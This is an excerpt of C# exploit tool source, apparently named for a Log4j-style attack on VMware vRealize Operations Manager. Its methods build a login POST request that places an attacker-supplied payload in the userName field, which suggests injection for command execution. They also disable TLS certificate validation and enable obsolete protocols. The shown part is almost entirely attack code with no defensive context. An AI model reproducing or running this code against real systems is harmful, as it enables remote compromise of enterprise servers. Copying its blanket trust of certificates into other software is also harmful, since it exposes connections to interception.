...
namespace Vm4j_exp.ExecPayload
{
    class VROM
    {
        ...
        public static string VROMEcho(string url, string cmd, string payload)
        {
            ...
            Log log = new Log();
            string postdata = "mainAction=login&userName="+payload+"&password=aaaaa&authSourceId=localItem&authSourceType=LOCAL";
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url.EndsWith("/") ? url + "ui/login.action" : url + "/ui/login.action");
#if DEBUG
        ...
        public static string VROMExec(string url, string payload)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.Expect100Continue = false;
